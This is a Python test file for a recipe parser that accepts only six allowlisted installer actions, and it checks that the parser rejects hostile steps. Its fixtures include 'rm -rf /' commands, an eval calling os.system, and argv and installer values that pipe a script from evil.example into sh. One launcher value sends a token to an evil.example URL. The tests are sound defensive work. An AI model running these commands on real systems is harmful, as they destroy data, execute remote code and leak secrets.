"""MAN-03 (phần recipe) + SEC-04 — ``parse`` chỉ nhận 6 action allowlist +
param typed; reject action/param lạ, shell/eval/url-script/template nội suy."""

from __future__ import annotations

import pytest

from namios_core.errors import ErrorCode
from namios_core.recipe_types import (
    CreateLauncher,
    CreatePrefix,
    InstallDependency,
    RunInstaller,
    SetRegistryValue,
    VerifyFile,
)
from namios_recipe import ALLOWED_ACTIONS, RecipeParseError, parse_recipe_steps

from ._fixtures import step


def test_allowed_actions_is_exactly_six() -> None:
    assert ALLOWED_ACTIONS == {
        "create_prefix",
        "install_dependency",
        "set_registry_value",
        "run_installer",
        "verify_file",
        "create_launcher",
    }


def test_valid_create_prefix_parses() -> None:
    steps = parse_recipe_steps([step("create_prefix", {"prefix_architecture": "win64"})])
    assert steps == (CreatePrefix(prefix_architecture="win64"),)


def test_valid_install_dependency_parses() -> None:
    steps = parse_recipe_steps(
        [step("install_dependency", {"dependency_profile_id": "dotnet-48-x64"})]
    )
    assert steps == (InstallDependency(dependency_profile_id="dotnet-48-x64"),)


def test_valid_set_registry_value_parses() -> None:
    steps = parse_recipe_steps(
        [
            step(
                "set_registry_value",
                {
                    "key": "HKCU\\Software\\Demo",
                    "value_name": "Mode",
                    "value_type": "REG_SZ",
                    "value": "1",
                },
            )
        ]
    )
    assert steps == (
        SetRegistryValue(
            key="HKCU\\Software\\Demo", value_name="Mode", value_type="REG_SZ", value="1"
        ),
    )


def test_valid_run_installer_argv_array_parses() -> None:
    steps = parse_recipe_steps(
        [
            step(
                "run_installer",
                {"installer_ref": "installer.exe", "argv": ["installer.exe", "/S", "/norestart"]},
            )
        ]
    )
    assert steps == (
        RunInstaller(installer_ref="installer.exe", argv=("installer.exe", "/S", "/norestart")),
    )


def test_valid_verify_file_parses() -> None:
    sha = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    steps = parse_recipe_steps([step("verify_file", {"path_label": "installer", "sha256": sha})])
    assert steps == (VerifyFile(path_label="installer", sha256=sha),)


def test_valid_create_launcher_parses() -> None:
    steps = parse_recipe_steps(
        [step("create_launcher", {"app_id": "notepad-plus-plus", "profile_id": "default"})]
    )
    assert steps == (CreateLauncher(app_id="notepad-plus-plus", profile_id="default"),)


def test_action_outside_allowlist_is_rejected() -> None:
    with pytest.raises(RecipeParseError) as exc_info:
        parse_recipe_steps([step("run_arbitrary_shell", {"cmd": "rm -rf /"})])

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_shell_param_key_is_forbidden_regardless_of_action() -> None:
    with pytest.raises(RecipeParseError) as exc_info:
        parse_recipe_steps(
            [
                step(
                    "run_installer",
                    {
                        "installer_ref": "installer.exe",
                        "argv": ["installer.exe", "/S"],
                        "shell": "rm -rf ~",
                    },
                )
            ]
        )

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)
    assert any("shell" in e.path for e in exc_info.value.errors)


def test_eval_param_key_is_forbidden_regardless_of_action() -> None:
    with pytest.raises(RecipeParseError) as exc_info:
        parse_recipe_steps(
            [
                step(
                    "set_registry_value",
                    {
                        "key": "HKCU\\Software\\Demo",
                        "value_name": "Mode",
                        "value_type": "REG_SZ",
                        "value": "1",
                        "eval": "os.system('rm -rf /')",
                    },
                )
            ]
        )

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_unknown_param_key_outside_allowlist_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [step("create_prefix", {"prefix_architecture": "win64", "extra_unknown": "x"})]
        )


def test_run_installer_concatenated_shell_string_single_argv_rejected() -> None:
    with pytest.raises(RecipeParseError) as exc_info:
        parse_recipe_steps(
            [
                step(
                    "run_installer",
                    {
                        "installer_ref": "installer.exe",
                        "argv": ["installer.exe /S && curl http://evil.example/x.sh | sh"],
                    },
                )
            ]
        )

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_run_installer_non_list_argv_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [
                step(
                    "run_installer",
                    {"installer_ref": "installer.exe", "argv": "installer.exe /S"},
                )
            ]
        )


def test_run_installer_non_string_argv_item_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [
                step(
                    "run_installer",
                    {"installer_ref": "installer.exe", "argv": ["installer.exe", 123]},
                )
            ]
        )


def test_template_interpolation_in_value_is_rejected() -> None:
    with pytest.raises(RecipeParseError) as exc_info:
        parse_recipe_steps(
            [
                step(
                    "set_registry_value",
                    {
                        "key": "HKCU\\Software\\Demo",
                        "value_name": "Mode",
                        "value_type": "REG_SZ",
                        "value": "{{ secrets.admin_password }}",
                    },
                )
            ]
        )

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_dollar_brace_template_interpolation_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [
                step(
                    "install_dependency",
                    {"dependency_profile_id": "${env.SECRET_DEP}"},
                )
            ]
        )


def test_url_script_pipe_to_shell_in_installer_ref_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [
                step(
                    "run_installer",
                    {
                        "installer_ref": "https://evil.example/x.sh | sh",
                        "argv": ["installer.exe", "/S"],
                    },
                )
            ]
        )


def test_create_launcher_with_embedded_url_is_rejected_comp006() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [
                step(
                    "create_launcher",
                    {"app_id": "demo", "profile_id": "http://evil.example/steal?token=1"},
                )
            ]
        )


def test_missing_required_param_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps([step("verify_file", {"path_label": "installer"})])


def test_invalid_prefix_architecture_value_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps([step("create_prefix", {"prefix_architecture": "arm64"})])


def test_invalid_sha256_format_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [step("verify_file", {"path_label": "installer", "sha256": "not-a-hash"})]
        )


def test_extra_top_level_key_on_step_is_rejected() -> None:
    raw = step("create_prefix", {"prefix_architecture": "win64"})
    raw["unexpected"] = "value"
    with pytest.raises(RecipeParseError):
        parse_recipe_steps([raw])


def test_params_not_object_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps([{"action": "create_prefix", "params": "win64"}])


def test_step_not_object_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(["create_prefix"])  # type: ignore[list-item]


def test_raw_steps_not_a_list_is_rejected() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps("not-a-list")  # type: ignore[arg-type]


def test_empty_recipe_parses_to_empty_tuple() -> None:
    assert parse_recipe_steps([]) == ()


def test_whole_recipe_rejected_when_any_step_invalid_no_partial_build() -> None:
    with pytest.raises(RecipeParseError):
        parse_recipe_steps(
            [
                step("create_prefix", {"prefix_architecture": "win64"}),
                step("run_arbitrary_shell", {"cmd": "rm -rf /"}),
            ]
        )
